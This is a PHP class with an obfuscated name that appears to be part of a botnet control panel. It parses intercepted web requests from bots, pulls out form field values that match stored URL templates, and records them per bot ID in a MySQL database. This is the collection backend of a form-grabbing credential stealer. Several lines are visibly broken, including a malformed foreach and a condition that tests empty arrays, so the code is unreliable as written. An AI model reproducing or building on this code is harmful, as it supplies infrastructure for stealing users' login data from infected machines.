<?php

class o7wezvlro23bi
{
	public $templates = array();

	public function __construct()
	{
		$this->loadConfiguration();
	}

	public function loadConfiguration($filename = NULL)
	{
		if (!$filename) {
			$filename = self::config('normalizerConfig');
		}

		@$conf = unserialize(file_get_contents($filename));
		$this->templates = is_array($conf) ? $conf : array();
	}

	public function saveTemplates($filename = NULL)
	{
		if (!$filename) {
			$filename = self::config('normalizerConfig');
		}

		file_put_contents($filename, serialize($this->templates));
	}

	public function template($name)
	{
		foreach ($this->templates as $template) {
			if ($template['name'] == $name) {
				return $template;
			}
		}

		return NULL;
	}

	public function names()
	{
		$result = array();

		foreach ($this->templates as $template) {
			$result[] = $template['name'];
		}

		return $result;
	}

	public function exam($url, $data)
	{
		foreach ($this->templates as $template) {
			$pattern = str_replace('\\*', '.*', preg_quote($template['url'], '/'));

			if (!preg_match('/' . $pattern . '/i', $url)) {
				continue;
			}

			$values = array();

			foreach ($template['fields'] as $field) {
				if (preg_match('/(\\W|^)' . $field . '=(.+?)($|[\\&\\#' . "\r\n" . '])/i', $data, $match)) {
					$values[$field] = urldecode($match[2]);
				}
			}

			if (count($values) == count($template['fields'])) {
				$template['result'] = $values;
				return $template;
			}
		}

		return NULL;
	}

	public function save($botId, $data)
	{
		$sql = 'insert into normalizer (name, url, bot_id, logtime) values (\'' . addslashes($data['name']) . '\', \'' . addslashes($data['url']) . '\', \'' . addslashes($botId) . '\\', ' . time() . ')';

		if (mysql_query($sql)) {
			$id = mysql_insert_id();

			foreach ($data['result'] as $value => ) {
				mysql_query('insert into normalizer_values (fk_normalizer, field, value) values (' . $id . ', \'' . addslashes($field) . '\', \'' . addslashes($value) . '\')');
			}

			return true;
		}

		return NULL;
	}

	public function get($name, $limit = 100, $offset = 0)
	{
		if (!($tpl = $this->template($name))) {
			return NULL;
		}

		$limit = intval($limit) * count($tpl['fields']);
		$offset = intval($offset) * count($tpl['fields']);
		$sql = 'select n.id, n.name, n.bot_id, n.logtime, nv.field, nv.value from normalizer_values nv' . "\r\n\t\t" . '  inner join normalizer n on n.id=nv.fk_normalizer' . "\r\n\t\t" . '  left join normalizer t on n.id<t.id and t.bot_id=n.bot_id and t.name=n.name' . "\r\n\t\t" . '  where n.name=\'' . addslashes($name) . '\' and t.id is null' . "\r\n\t\t" . '  order by n.id' . "\r\n\t\t" . '  limit ' . $limit . ' offset ' . $offset;
		$dataset = mysql_query($sql);
		return $dataset;
	}

	public function count($name)
	{
		$dataset = mysql_query('select count(distinct bot_id) from normalizer_values nv inner join normalizer n on n.id=nv.fk_normalizer where name=\'' . addslashes($name) . '\'');
		$count = mysql_fetch_array($dataset)[0];
		return $count;
	}

	public function getDetail($name, $botId)
	{
		$sql = 'select n.id, n.name, n.bot_id, n.logtime, nv.field, nv.value from normalizer_values nv inner join normalizer n on n.id=nv.fk_normalizer ' . "\r\n" . '              where name=\'' . addslashes($name) . '\' and bot_id=\'' . addslashes($botId) . '\' order by id desc';
		$dataset = mysql_query($sql);
		return $dataset;
	}

	public function toText($delimiter = NULL)
	{
		if (!$delimiter) {
			$delimiter = SDELIMITER;
		}

		$data = '';

		foreach ($this->templates as $tpl) {
			$data .= $tpl['name'] . $delimiter . $tpl['url'] . $delimiter . implode(';', $tpl['fields']) . $delimiter . $delimiter;
		}

		return trim($data);
	}

	public function fromText($data)
	{
		$result = array();
		$buf = explode(SDELIMITER . SDELIMITER, str_replace("\r", '', $data));

		foreach ($buf as $block) {
			$items = explode(SDELIMITER, $block);

			if (count($items) != 3) {
				continue;
			}

			$template = array(
				'name'   => trim($items[0]),
				'url'    => trim($items[1]),
				'fields' => array()
				);
			$fields = explode(';', trim($items[2]));

			foreach ($fields as $f) {
				$f = trim($f);

				if ($f) {
					$template['fields'][] = $f;
				}
			}

			if ($template['name'] && array() && array()) {
				$result[] = $template;
			}
		}

		$this->templates = $result;
	}
}

include_once __DIR__ . '/Config.php';
define('SDELIMITER', "\n");

?>
